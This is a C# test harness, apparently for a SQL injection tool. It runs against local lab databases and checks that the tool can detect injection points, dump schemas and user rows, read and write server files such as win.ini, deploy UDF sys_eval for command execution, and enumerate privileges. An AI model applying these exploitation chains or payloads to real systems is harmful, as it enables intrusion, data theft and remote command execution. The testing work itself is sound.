    Check("污染场景剔除回显取真值", DataComm.ParseUnionOrErrorData(resp2, dirtyPayload) == "root");
    //对照：不剔除时确实会抓到脏数据（证明测试有效）
    Check("不剔除时复现脏数据", DataComm.ParseUnionOrErrorData(resp2) == "FAKE");

    // ---- 3. UpdateMarkedComment 注释符联动 ----
    string mysqlMarked = "GET /x.jsp?id=1<Encode> and $sql$#</Encode> HTTP/1.1";
    string pgMarked = "GET /x.jsp?id=1<Encode> and $sql$-- </Encode> HTTP/1.1";
    string accessMarked = "GET /x.jsp?id=1<Encode> and $sql$)</Encode> HTTP/1.1";
    Check("MySQL→MySQL不变", InjectTools.UpdateMarkedComment(mysqlMarked, DBType.MySQL) == mysqlMarked);
    Check("MySQL→PG：#改-- ", InjectTools.UpdateMarkedComment(mysqlMarked, DBType.PostgreSQL) == pgMarked);
    Check("PG→MySQL：-- 改#", InjectTools.UpdateMarkedComment(pgMarked, DBType.MySQL) == mysqlMarked);
    Check("PG→Access：去注释", InjectTools.UpdateMarkedComment(pgMarked, DBType.Access) == "GET /x.jsp?id=1<Encode> and $sql$</Encode> HTTP/1.1");
    Check("Access→MySQL：suffix前移入注释", InjectTools.UpdateMarkedComment(accessMarked, DBType.MySQL) == "GET /x.jsp?id=1<Encode> and $sql$#)</Encode> HTTP/1.1");
    Check("MySQL(#+suffix)→Access：剥#恢复suffix", InjectTools.UpdateMarkedComment("GET /x.jsp?id=1<Encode> and $sql$#)</Encode> HTTP/1.1", DBType.Access) == accessMarked);
    Check("无注入标记原样返回", InjectTools.UpdateMarkedComment("GET /x.jsp?id=1 HTTP/1.1", DBType.MySQL) == "GET /x.jsp?id=1 HTTP/1.1");
    Check("空串不炸", InjectTools.UpdateMarkedComment("", DBType.MySQL) == "");

    Console.WriteLine($"===== 回显/注释符自检结果: PASS={pass} FAIL={fail} =====");
}

/// <summary>
/// Access字典猜解机制验证：借用sqlite靶场（未知列同样产生真假差异），
/// 验证 CheckCondition + exists_column 模板 + 真假判定的完整猜解链路
/// </summary>
static async Task GuessTest()
{
    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;
    config.DataConfig.DetectLevel = 1;
    config.DataConfig.DetectRisk = 1;
    string requestTxt =
        "GET /num?db=sqlite&id=1 HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Accept: */*\r\n" +
        "Connection: close\r\n\r\n";
    List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, requestTxt, "id", "1", ParamPlace.Query, "") ?? new List<InjectPoint>();
    var best = hits.FirstOrDefault(h => h.InjectType == InjectType.Blind && h.BoolInjectType == BoolInjectType.KeyWord) ?? hits.FirstOrDefault();
    if (best == null)
    {
        Console.WriteLine("GuessTest FAIL: 未检出盲注注入点");
        return;
    }
    config.DataConfig.SelectedInjectType = best.InjectType;
    config.DataConfig.SelectBoolInject = best.BoolInjectType;
    config.DataConfig.CheckValue = best.CheckValue;
    config.DataConfig.Reverse = best.Revers;
    config.DataConfig.SelectedDBType = DBType.SQLite;
    config.RequestTxt = best.RequestTxt;
    PayloadFactory.Init(DBType.SQLite);
    string tpl = PayloadFactory.BasePayload.Get("exists_column");
    string[] words = { "id", "username", "password", "email", "nosuchcol", "hacker_field" };
    bool allOk = true;
    Console.WriteLine("===== Access字典猜解机制验证（sqlite靶场模拟布尔差异） =====");
    foreach (string w in words)
    {
        bool exists = await DataComm.CheckCondition(config, string.Format(tpl, w, "users"));
        bool expect = w == "id" || w == "username" || w == "password" || w == "email";
        bool ok = exists == expect;
        allOk &= ok;
        Console.WriteLine($"  {w}: exists={exists} 期望={expect} {(ok ? "OK" : "BAD")}");
    }
    Console.WriteLine(allOk ? "===== GuessTest PASS =====" : "===== GuessTest FAIL =====");
}

/// <summary>
/// 全功能矩阵验证：对检出的每个通道（Union/Error/关键字盲注）依次验证
/// 环境变量、获取库、获取表、获取字段、行数据五项利用能力
/// </summary>
static async Task<string> RunFullMatrix(AppConfig config, string targetDb, DBType dbType, List<InjectPoint> hits, string tag)
{
    string metaName = targetDb switch
    {
        "sqlite" => "main",
        "mysql" => "sqli_test",
        "mysqlc" => "sqli_test",
        "sqlserver" => "sqli_test",
        "sqlserver08" => "sqli_test",
        "pgsql" => "public",
        "kingbase" => "public",
        "dm" => "SYSDBA",
        "oracle" => "SQLI",
        "h2" => "PUBLIC",
        "hsqldb" => "PUBLIC",
        "opengauss" => "public",
        "db2" => "DB2INST1",
        "clickhouse" => "sqli_test",
        _ => "main"
    };
    string versionExpr = dbType switch
    {
        DBType.MySQL => "version()",
        DBType.PostgreSQL => "version()",
        DBType.SQLServer => "@@version",
        DBType.SQLite => "sqlite_version()",
        DBType.DM => "(select banner from v$version where rownum=1)",
        DBType.Oracle => "(select banner from v$version where rownum=1)",
        DBType.H2 => "h2version()",
        DBType.HSQLDB => "database_version()",
        DBType.DB2 => "(select rtrim(cast(versionnumber as char(254))) from sysibm.sysversions)",
        DBType.ClickHouse => "version()",
        _ => "version()"
    };

    var channels = new List<InjectPoint>();
    var unionHit = hits.FirstOrDefault(h => h.InjectType == InjectType.Union);
    var errorHit = hits.FirstOrDefault(h => h.InjectType == InjectType.Error);
    var blindHit = hits.FirstOrDefault(h => h.InjectType == InjectType.Blind && h.BoolInjectType == BoolInjectType.KeyWord);
    if (unionHit != null) channels.Add(unionHit);
    if (errorHit != null) channels.Add(errorHit);
    if (blindHit != null) channels.Add(blindHit);
    if (channels.Count == 0) channels.Add(hits[^1]);

    int pass = 0, fail = 0;
    var fails = new List<string>();

    foreach (var hit in channels)
    {
        string ch = hit.InjectType.ToString();
        config.DataConfig.SelectedInjectType = hit.InjectType;
        config.RequestTxt = hit.RequestTxt;
        if (hit.InjectType == InjectType.Blind)
        {
            config.DataConfig.SelectBoolInject = hit.BoolInjectType;
            config.DataConfig.CheckValue = hit.CheckValue;
            config.DataConfig.Reverse = hit.Revers;
        }
        if (hit.InjectType == InjectType.Union)
        {
            config.DataConfig.SumColumnCount = hit.SumColumnCount;
            config.DataConfig.ShowColumnIndex = hit.ShowColumnIndex;
        }

        async Task<string> GetData(string expr)
        {
            return hit.InjectType switch
            {
                InjectType.Union => await DataComm.DataDumpWithNoFrom(config, expr).ConfigureAwait(false),
                InjectType.Error => await DataComm.DataDumpWithError(config, expr).ConfigureAwait(false),
                _ => await DataComm.GetStringByBool(config, expr, 256).ConfigureAwait(false)
            };
        }
        async Task<int> GetCount(string expr)
        {
            if (hit.InjectType == InjectType.Blind)
            {
                return await DataComm.GetValueLen(config, expr, 0, 1000).ConfigureAwait(false);
            }
            string v = await GetData(expr).ConfigureAwait(false);
            return int.TryParse((v ?? "").Trim(), out int n) ? n : -1;
        }
        async Task Check(string name, Func<Task<bool>> test, Func<string> detail)
        {
            bool ok; string d;
            try { ok = await test(); d = detail(); }
            catch (Exception e) { ok = false; d = "异常:" + e.Message; }
            if (ok) { pass++; Console.WriteLine($"[{tag}][{ch}] {name}: PASS {d}"); }
            else { fail++; fails.Add(ch + "." + name); Console.WriteLine($"[{tag}][{ch}] {name}: FAIL {d}"); }
        }

        // 1. 环境变量（版本）
        string ver = "";
        await Check("环境变量", async () => { ver = await GetData(versionExpr).ConfigureAwait(false); return !string.IsNullOrWhiteSpace(ver); },  ()=> "-> " + Truncate(ver ?? "", 40));

        // 2. 获取库
        int dbCnt = -1; string dbName = "";
        await Check("获取库", async () =>
        {
            dbCnt = await GetCount(PayloadFactory.BasePayload.DBCount).ConfigureAwait(false);
            dbName = await GetData(PayloadFactory.BPTool.GetDBName(0)).ConfigureAwait(false);
            return dbCnt >= 1 && !string.IsNullOrWhiteSpace(dbName);
        },  ()=> $"-> count={dbCnt} first={dbName}");

        // 3. 获取表
        int tCnt = -1; string tName = "";
        await Check("获取表", async () =>
        {
            tCnt = await GetCount(PayloadFactory.BPTool.GetTableCount(metaName)).ConfigureAwait(false);
            tName = await GetData(PayloadFactory.BPTool.GetTableName(metaName, 0)).ConfigureAwait(false);
            return tCnt >= 1 && !string.IsNullOrWhiteSpace(tName);
        },  ()=> $"-> count={tCnt} first={tName}");

        // 4. 获取字段（users 表应为 id/username/password/email）
        int cCnt = -1; string c0 = "";
        await Check("获取字段", async () =>
        {
            cCnt = await GetCount(PayloadFactory.BPTool.GetColumnCount(metaName, "users")).ConfigureAwait(false);
            c0 = await GetData(PayloadFactory.BPTool.GetColumnName(metaName, "users", 0)).ConfigureAwait(false);
            return cCnt == 4 && string.Equals(c0, "id", StringComparison.OrdinalIgnoreCase);
        },  ()=> $"-> count={cCnt} first={c0}");

        // 5. 行数据（users 第1行 username 应为 admin）
        string cell = "";
        await Check("行数据", async () =>
        {
            if (hit.InjectType == InjectType.Union)
            {
                var dp = new DumpDataParam(new List<string> { "username" }, metaName, "users", hit.SumColumnCount, hit.ShowColumnIndex);
                dp.DataIndex = 0;
                cell = await DataComm.DataDump(config, PayloadFactory.BPTool.UnionData(dp)).ConfigureAwait(false);
            }
            else
            {
                var dp = new DumpDataParam(new List<string> { "username" }, metaName, "users", 0);
                cell = await GetData(PayloadFactory.BPTool.DataValue(dp)).ConfigureAwait(false);
            }
            return (cell ?? "").Contains("admin");
        },  ()=> "-> " + Truncate(cell ?? "", 40));
    }

    string summary = $"通道{channels.Count}个({string.Join("/", channels.Select(c => c.InjectType))}) 通过{pass} 失败{fail}";
    return fail == 0 ? $"PASS({summary})" : $"FAIL({summary}; 失败项: {string.Join(",", fails)})";
}

/// <summary>
/// Windows本地MySQL文件/命令验证：写读在 secure_file_priv 默认目录（Uploads），
/// 直读系统文件作参考项，命令执行走UDF sys_eval（whoami）
/// </summary>
static async Task<string> RunFileCmdWin(AppConfig config, string targetDb, string tag)
{
    var vm = config.FileCmd;
    var results = new List<string>();

    //按目标库分派读写方法：mysql=MySQL Windows靶机(load_file/into outfile)；
    //sqlserver08=SQLServer Windows靶机(BULK INSERT读 + FileSystemObject写)
    bool isSqlServer = targetDb is "sqlserver08" or "sqlserver";
    string readMethod = isSqlServer ? "BULK INSERT读文件" : "Load_File读文件";
    string writeMethod = isSqlServer ? "FileSystemObject写文件" : "Union写文件";

    string wpath = isSqlServer ? "C:/Windows/Temp/sqli_w_test.txt" : "C:/ProgramData/MySQL/MySQL Server 5.7/Uploads/sqli_w_test.txt";
    string wcontent = "hello_sqli_123";
    vm.FilePath = wpath;
    vm.FileContent = wcontent;
    vm.SelectedFileMethod = writeMethod;
    await FileCmdTools.ExecuteFile(config, vm);
    vm.FileContent = "";
    vm.SelectedFileMethod = readMethod;
    await FileCmdTools.ExecuteFile(config, vm);
    string back = (vm.FileContent ?? "").Trim();
    bool writeOk = back.Contains(wcontent);
    Console.WriteLine($"[{tag}] 写文件+读回({writeMethod} {wpath}): {(writeOk ? "PASS" : "FAIL")} -> {Truncate(back, 40)}");
    results.Add($"写读文件{(writeOk ? "PASS" : "FAIL")}");

    vm.FilePath = "C:/Windows/win.ini";
    vm.FileContent = "";
    await FileCmdTools.ExecuteFile(config, vm);
    string sysread = (vm.FileContent ?? "").Trim();
    Console.WriteLine($"[{tag}] 直读win.ini({readMethod}): {(sysread.Length > 0 ? "PASS" : "FAIL(可能权限/配置限制)")} -> {Truncate(sysread, 40)}");
    results.Add($"直读系统文件{(sysread.Length > 0 ? "PASS" : "SKIP(受限)")}");

    //SQLServer Windows靶机追加验证：FileSystemObject读文件（sp_oacreate，与BULK INSERT并行的第二条读通道）
    if (isSqlServer)
    {
        vm.FilePath = "C:/Windows/Temp/sqli_w_test.txt"; //读回刚写入的文件，内容已知便于断言
        vm.FileContent = "";
        vm.SelectedFileMethod = "FileSystemObject读文件";
        await FileCmdTools.ExecuteFile(config, vm);
        string fsoRead = (vm.FileContent ?? "").Trim();
        bool fsoOk = fsoRead.Contains(wcontent);
        Console.WriteLine($"[{tag}] FileSystemObject读文件({vm.FilePath}): {(fsoOk ? "PASS" : "FAIL")} -> {Truncate(fsoRead, 40)}");
        results.Add($"FSO读文件{(fsoOk ? "PASS" : "FAIL")}");
    }

    //Windows本机MySQL secure_file_priv锁定Uploads：UDF dll无法into dumpfile到plugin_dir，命令执行必然失败，标注SKIP（Linux容器由filecmd:mysqlc覆盖验证）
    if (targetDb == "mysql")
    {
        Console.WriteLine($"[{tag}] 命令执行: SKIP（secure_file_priv锁定Uploads，UDF无法写入plugin_dir，见filecmd:mysqlc）");
        results.Add("命令执行SKIP(secure_file_priv受限)");
        return string.Join("; ", results);
    }
    vm.CmdText = "whoami";
    vm.CmdShowResult = true;
    vm.CmdResult = "";
    await FileCmdTools.ExecuteCmd(config, vm);
    string cmdRes = (vm.CmdResult ?? "").Trim();
    bool cmdOk = cmdRes.Length > 0 && !cmdRes.Contains("失败") && !cmdRes.Contains("异常");
    Console.WriteLine($"[{tag}] 命令执行(whoami): {(cmdOk ? "PASS" : "FAIL")} -> {Truncate(cmdRes, 60)}");
    results.Add($"命令执行{(cmdOk ? "PASS" : "FAIL")}");
    return string.Join("; ", results);
}

/// <summary>
/// smart智能模式闸门B反向自检：内置TcpListener静态页面（任何请求返回完全相同页面），
/// 验证开启smart后启发式无迹象时跳过深度检测（日志提示+请求数恒定11），
/// 关闭smart的对照组则继续深度检测电池（请求数显著>11），证明跳过的确由闸门B触发。
/// 理论请求数：3基线+1原始+2动态性噪声+5指纹探针=11。
/// </summary>
static async Task SmartTestAsync()
{
    Console.WriteLine("===== smart闸门B反向自检（静态无指纹页面） =====");
    int pass = 0, fail = 0;

    //1. 内置静态页面服务器：任何请求都返回同一固定页面
    var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
    listener.Start();
    int port = ((System.Net.IPEndPoint)listener.LocalEndpoint).Port;
    int reqCount = 0;
    var cts = new CancellationTokenSource();
    string page = "<html><head><title>static</title></head><body><p>static page, nothing changes here.</p></body></html>";
    byte[] bodyBytes = System.Text.Encoding.UTF8.GetBytes(page);
    string respHead = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: " + bodyBytes.Length + "\r\nConnection: close\r\n\r\n";
    var acceptTask = Task.Run(async () =>
    {
        while (!cts.IsCancellationRequested)
        {
            System.Net.Sockets.TcpClient client;
            try { client = await listener.AcceptTcpClientAsync(cts.Token); }
            catch { break; }
            _ = Task.Run(async () =>
            {
                try
                {
                    using (client)
                    {
                        var ns = client.GetStream();
                        //读请求头到\r\n\r\n（GET无body），请求头为ASCII直接按字符串累积判断
                        var buf = new byte[8192];
                        var sb = new System.Text.StringBuilder();
                        ns.ReadTimeout = 3000;
                        while (!sb.ToString().Contains("\r\n\r\n"))
                        {
                            int n = await ns.ReadAsync(buf, 0, buf.Length);
                            if (n <= 0) break;
                            sb.Append(System.Text.Encoding.ASCII.GetString(buf, 0, n));
                            if (sb.Length > 65536) break;
                        }
                        Interlocked.Increment(ref reqCount);
                        byte[] head = System.Text.Encoding.ASCII.GetBytes(respHead);
                        await ns.WriteAsync(head, 0, head.Length);
                        await ns.WriteAsync(bodyBytes, 0, bodyBytes.Length);
                        await ns.FlushAsync();
                    }
                }
                catch { }
            });
        }
    });
    Console.WriteLine($"静态页面服务已启动: 127.0.0.1:{port}");

    string reqTxt =
        $"GET /static?id=1 HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{port}\r\n" +
        "User-Agent: SmartTest\r\n" +
        "Accept: */*\r\n" +
        "Connection: close\r\n\r\n";

    async Task<(int hits, int reqs, string logs)> RunDetect(bool smart)
    {
        var config = new AppConfig();
        Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
        config.Host = "127.0.0.1";
        config.Port = port;
        config.IsSSL = false;
        config.TimeOut = 10;
        config.DataConfig.DetectLevel = 1;
        config.DataConfig.DetectRisk = 1;
        config.DataConfig.SmartMode = smart;
        config.RequestTxt = reqTxt;

        //捕获Headless模式下LogTool.Show的Console输出
        var sw = new StringWriter();
        var oldOut = Console.Out;
        Console.SetOut(sw);
        int before = reqCount;
        List<InjectPoint> hits;
        try
        {
            hits = await InjectDetectEngine.DetectParam(config, reqTxt, "id", "1") ?? new List<InjectPoint>();
        }
        finally
        {
            Console.SetOut(oldOut);
        }
        return (hits.Count, reqCount - before, sw.ToString());
    }

    //2. smart=true：静态页面无任何动态特征/错误指纹，闸门B应跳过深度检测
    var smartOn = await RunDetect(true);
    bool skipLogged = smartOn.logs.Contains("跳过深度检测");
    bool reqOk = smartOn.reqs >= 9 && smartOn.reqs <= 12;
    bool noHit = smartOn.hits == 0;
    Console.WriteLine($"[smart=开] 命中={smartOn.hits} 发包={smartOn.reqs}(理论11) 跳过日志={(skipLogged ? "有" : "无")}");
    bool onOk = noHit && reqOk && skipLogged;
    Console.WriteLine($"[smart=开] {(onOk ? "PASS" : "FAIL")}（命中0={noHit} 发包恒定={reqOk} 跳过提示={skipLogged}）");
    if (onOk) pass++; else fail++;

    //3. smart=false对照组：同页面应继续深度检测电池，发包数显著>11；
    //后台跑检测，发包数到20或90s超时后SignalStop中断（静态页面不会命中，hits不作断言）
    var config2 = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config2 };
    config2.Host = "127.0.0.1";
    config2.Port = port;
    config2.IsSSL = false;
    config2.TimeOut = 10;
    config2.DataConfig.DetectLevel = 1;
    config2.DataConfig.DetectRisk = 1;
    config2.DataConfig.SmartMode = false;
    config2.RequestTxt = reqTxt;
    int before2 = reqCount;
    var detectTask = Task.Run(async () =>
    {
        try { await InjectDetectEngine.DetectParam(config2, reqTxt, "id", "1"); }
        catch (OperationCanceledException) { }
        catch { }
    });
    var waitSw = System.Diagnostics.Stopwatch.StartNew();
    while (!detectTask.IsCompleted && reqCount - before2 < 20 && waitSw.Elapsed.TotalSeconds < 90)
    {
        await Task.Delay(200);
    }
    int ctrlReqs = reqCount - before2;
    if (!detectTask.IsCompleted)
    {
        config2.SignalStop();
        try { await detectTask; } catch { }
    }
    bool ctrlOk = ctrlReqs >= 20;
    Console.WriteLine($"[smart=关] 对照组发包={ctrlReqs}(>11即证明闸门B才是跳过原因): {(ctrlOk ? "PASS" : "FAIL")}");
    if (ctrlOk) pass++; else fail++;

    cts.Cancel();
    listener.Stop();
    Console.WriteLine($"===== smart自检结果: PASS={pass} FAIL={fail} =====");
}

/// <summary>
/// PG UDF 全链路活体验证（pgsql94 @5099，PostgreSQL 9.4.26 容器 sqli-pgsql94）：
/// 检测→应用Union注入点→UDF部署（大对象分页写入+lo_export+create function，部署语句堆叠发送）→sys_eval执行→痕迹清理
/// </summary>
static async Task PgUdfTestAsync()
{
    Console.WriteLine("===== PG UDF 命令执行全链路验证（pgsql94，PostgreSQL 9.4）=====");
    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 20;
    string reqTxt = $"GET /num?db=pgsql94&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nUser-Agent: SuperSQLInjectionV2-TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
    List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, reqTxt, "id", "1") ?? new List<InjectPoint>();
    Console.WriteLine("检出通道：" + string.Join(",", hits.Select(h => h.InjectType)));
    var union = hits.FirstOrDefault(h => h.InjectType == InjectType.Union);
    bool hasStacked = hits.Any(h => h.InjectType == InjectType.Stacked);
    if (union == null || !hasStacked)
    {
        Console.WriteLine($"===== pgudf结果: FAIL（需要Union取值+Stacked部署命中，union={union != null} stacked={hasStacked}） =====");
        return;
    }
    config.DataConfig.SelectedInjectType = InjectType.Union;
    config.DataConfig.SelectedDBType = DBType.PostgreSQL;
    config.DataConfig.ShowColumnIndex = union.ShowColumnIndex;
    config.DataConfig.SumColumnCount = union.SumColumnCount;
    config.RequestTxt = union.RequestTxt;
    PayloadFactory.Init(DBType.PostgreSQL);

    var vm = new FileCmdViewModel(config);
    vm.SelectedCmdMethod = "UDF sys_eval";
    vm.CmdText = "id";
    vm.CmdShowResult = true;
    await FileCmdTools.ExecuteCmd(config, vm);
    string res = vm.CmdResult ?? "";
    bool ok = res.Contains("uid=");
    Console.WriteLine($"sys_eval(id) => {(res.Length > 80 ? res.Substring(0, 80) : res)} : {(ok ? "PASS" : "FAIL")}");

    //清理痕迹（drop函数+尽力删除库文件）
    await FileCmdTools.CleanupUdf(config);
    Console.WriteLine($"===== pgudf结果: {(ok ? "PASS" : "FAIL")} =====");
}

/// <summary>
/// 权限角色枚举活体验证（privileges/roles 能力）：mysql/pgsql94/sqlserver 三库 Union 通道读取权限条目
/// </summary>
static async Task PrivTestAsync()
{
    Console.WriteLine("===== 权限角色枚举活体验证（mysql/pgsql94/sqlserver）=====");
    int pass = 0, fail = 0;
    foreach (string db in new[] { "mysql", "pgsql94", "sqlserver" })
    {
        var config = new AppConfig();
        Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
        config.Host = "127.0.0.1";
        config.Port = twaPort;
        config.IsSSL = false;
        config.TimeOut = 15;
        string reqTxt = $"GET /num?db={db}&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nUser-Agent: SuperSQLInjectionV2-TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
        List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, reqTxt, "id", "1") ?? new List<InjectPoint>();
        var union = hits.FirstOrDefault(h => h.InjectType == InjectType.Union);
        if (union == null)
        {
            Console.WriteLine($"[{db}] FAIL: 未检出Union通道");
            fail++;
            continue;
        }
        DBType dbType = db == "mysql" ? DBType.MySQL : db == "sqlserver" ? DBType.SQLServer : DBType.PostgreSQL;
        config.DataConfig.SelectedInjectType = InjectType.Union;
        config.DataConfig.SelectedDBType = dbType;
        config.DataConfig.ShowColumnIndex = union.ShowColumnIndex;
        config.DataConfig.SumColumnCount = union.SumColumnCount;
        config.RequestTxt = union.RequestTxt;
        PayloadFactory.Init(dbType);

        var priv = new System.Collections.ObjectModel.ObservableCollection<VersModel>();
        VersTools.ReadVersByDBType(dbType, new System.Collections.ObjectModel.ObservableCollection<VersModel>(), new System.Collections.ObjectModel.ObservableCollection<VersModel>(), priv);
        if (priv.Count == 0)
        {
            Console.WriteLine($"[{db}] FAIL: 无权限/角色模板条目");
            fail++;
            continue;
        }
        int okCnt = 0;
        foreach (var item in priv)
        {
            string payload = PayloadFactory.BPTool.UnionAll(item.VerPayload, (int)config.DataConfig.SumColumnCount, (int)config.DataConfig.ShowColumnIndex);
            var req = new HttpRequest(config);
            req.Payload = payload;
            var resp = await HTTPTool.SendRequestRetryAsync(req).ConfigureAwait(false);
            string val = (DataComm.ParseUnionOrErrorData(resp, payload) ?? "").Trim();
            bool ok = val.Length > 0;
            if (ok) okCnt++;
            Console.WriteLine($"[{db}] {item.Name} => {(val.Length > 90 ? val.Substring(0, 90) + "…" : val)} {(ok ? "OK" : "EMPTY")}");
        }
        bool dbOk = okCnt > 0;
        Console.WriteLine($"[{db}] {(dbOk ? "PASS" : "FAIL")}（{okCnt}/{priv.Count} 条权限条目取到值）");
        if (dbOk) pass++; else fail++;
    }
    Console.WriteLine($"===== priv结果: PASS={pass} FAIL={fail} =====");
}

/// <summary>
/// 跳过参数（jumpkey.txt）自检：加载解析、大小写不敏感、保存回读往返一致性
/// </summary>
static void JumpkeyTest()
{
    Console.WriteLine("===== 跳过参数 jumpkey.txt 自检 =====");
    int pass = 0, fail = 0;

    //1. 加载：内置列表必须包含常见静态参数
    List<string> items = SuperSQLInjectionV2.Tools.JumpkeyTool.Load();
    bool hasSubmit = items.Contains("submit", StringComparer.OrdinalIgnoreCase);
    bool hasViewState = items.Contains("__VIEWSTATE", StringComparer.OrdinalIgnoreCase);
    Console.WriteLine($"[加载] 共{items.Count}项，含submit={hasSubmit} 含__VIEWSTATE={hasViewState}：{(hasSubmit && hasViewState ? "PASS" : "FAIL")}");
    if (hasSubmit && hasViewState) pass++; else fail++;

    //2. 检测字典大小写不敏感（Query参数Submit/SUBMIT都应命中）
    var dict = SuperSQLInjectionV2.Tools.JumpkeyTool.ToDict(items);
    bool ci = dict.ContainsKey("SUBMIT") && dict.ContainsKey("__viewstate");
    Console.WriteLine($"[字典] 大小写不敏感命中={(ci ? "是" : "否")}：{(ci ? "PASS" : "FAIL")}");
    if (ci) pass++; else fail++;

    //3. 保存回读往返：追加一项→保存→重载→断言→还原
    string marker = "test_skip_xyz";
    List<string> original = new List<string>(items);
    try
    {
        items.Add(marker);
        SuperSQLInjectionV2.Tools.JumpkeyTool.Save(items);
        List<string> reloaded = SuperSQLInjectionV2.Tools.JumpkeyTool.Load();
        bool roundtrip = reloaded.Contains(marker) && reloaded.Count == original.Count + 1;
        Console.WriteLine($"[往返] 追加保存后重载含新项={roundtrip}（{original.Count}→{reloaded.Count}）：{(roundtrip ? "PASS" : "FAIL")}");
        if (roundtrip) pass++; else fail++;
    }
    finally
    {
        SuperSQLInjectionV2.Tools.JumpkeyTool.Save(original);
    }

    Console.WriteLine($"===== jumpkey结果: PASS={pass} FAIL={fail} =====");
}

// ===== 检测Payload管理冒烟：加载统计 + 增/改/删闭环（只动custom_user.xml，不碰官方文件） =====
static void PayloadMgrTest()
{
    int pass = 0, fail = 0;
    var all = InjectPayloadManager.LoadAll();
    Console.WriteLine($"[加载] 用例总数={all.Count}，文件数={InjectPayloadManager.ListFiles().Count}");
    foreach (var g in all.GroupBy(p => p.FileName))
        Console.WriteLine($"  - {g.Key}: {g.Count()}条");
    bool loaded = all.Count > 0 && all.Any(p => p.FileName == "dns_blind.xml");
    Console.WriteLine($"[加载] 含dns_blind.xml={loaded}：{(loaded ? "PASS" : "FAIL")}");
    if (loaded) pass++; else fail++;

    //DNS用例经GetDnsTests可过滤取出（level1 risk3应取出全部4条）
    InjectPayloadLoader.ResetCache();
    var dnsTests = InjectPayloadLoader.GetDnsTests(1, 3);
    bool dnsOk = dnsTests.Count == 4 && dnsTests.All(t => t.SType == 7);
    Console.WriteLine($"[DNS用例] level1/risk3取出{dnsTests.Count}条（期望4，stype=7）：{(dnsOk ? "PASS" : "FAIL")}");
    if (dnsOk) pass++; else fail++;

    //增：新增一条到custom_user.xml
    string marker = "冒烟测试用例_" + DateTime.Now.Ticks;
    var item = new SuperSQLInjectionV2.Models.Detect.PayloadItem
    {
        FileName = InjectPayloadManager.UserFile, Index = -1,
        Title = marker, SType = 2, Level = 1, Risk = 1,
        Clause = "1,2,3,8,9", Where = "1",
        Vector = "AND 1=[QUERY]", Payload = "AND 1=CONVERT(int,(SELECT '[QUERY]'))",
        Dbms = "Microsoft SQL Server"
    };
    InjectPayloadManager.Save(item);
    var afterAdd = InjectPayloadManager.LoadAll();
    bool added = afterAdd.Any(p => p.Title == marker && p.FileName == InjectPayloadManager.UserFile && p.Index >= 0);
    Console.WriteLine($"[新增] 追加后重载命中={added}：{(added ? "PASS" : "FAIL")}");
    if (added) pass++; else fail++;

    //改：修改payload与级别后保存
    var saved = afterAdd.First(p => p.Title == marker);
    saved.Level = 3;
    saved.Payload = "AND 2=CONVERT(int,(SELECT '[QUERY]'))";
    InjectPayloadManager.Save(saved);
    var afterEdit = InjectPayloadManager.LoadAll().FirstOrDefault(p => p.Title == marker);
    bool edited = afterEdit != null && afterEdit.Level == 3 && afterEdit.Payload.Contains("AND 2=");
    Console.WriteLine($"[修改] 重载Level={afterEdit?.Level} Payload含AND 2={edited}：{(edited ? "PASS" : "FAIL")}");
    if (edited) pass++; else fail++;

    //删：删除后重载应不存在
    bool delOk = InjectPayloadManager.Delete(afterEdit);
    var afterDel = InjectPayloadManager.LoadAll();
    bool gone = delOk && !afterDel.Any(p => p.Title == marker);
    Console.WriteLine($"[删除] 删除后重载不存在={gone}：{(gone ? "PASS" : "FAIL")}");
    if (gone) pass++; else fail++;

    //官方文件未被改动（条数与首次加载一致）
    bool officialIntact = afterDel.Count == all.Count;
    Console.WriteLine($"[回归] 删后总数={afterDel.Count}（应={all.Count}）：{(officialIntact ? "PASS" : "FAIL")}");
    if (officialIntact) pass++; else fail++;

    Console.WriteLine($"===== payload管理结果: PASS={pass} FAIL={fail} =====");
}

// ===== UA池冒烟：类型识别 + 旧配置迁移 + JSON往返 =====
static void UaPoolTest()
{
    int pass = 0, fail = 0;
    //1. 类型识别
    //类型命名：只保留系统名（用户决策：不带PC/手机/平板前缀）
    (string ua, string expect)[] cases = {
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0.0.0", "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/18.6 Safari/605.1.15", "macOS"),
        ("Mozilla/5.0 (X11; Linux x86_64) Chrome/140.0.0.0", "Linux"),
        ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) Mobile/15E148", "iPhone"),
        ("Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) Mobile Safari/537.36", "Android"),
        ("Mozilla/5.0 (Phone; OpenHarmony 5.0) ArkWeb/4.1.6.1", "HarmonyOS"),
        ("Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X)", "iPad"),
        ("curl/8.5.0", "其他"),
    };
    foreach (var (ua, expect) in cases)
    {
        string got = SuperSQLInjectionV2.Models.UaItem.InferType(ua);
        bool ok = got == expect;
        Console.WriteLine($"[识别] {(ua.Length > 45 ? ua.Substring(0, 45) + "..." : ua)} => {got}（期望{expect}）：{(ok ? "PASS" : "FAIL")}");
        if (ok) pass++; else fail++;
    }

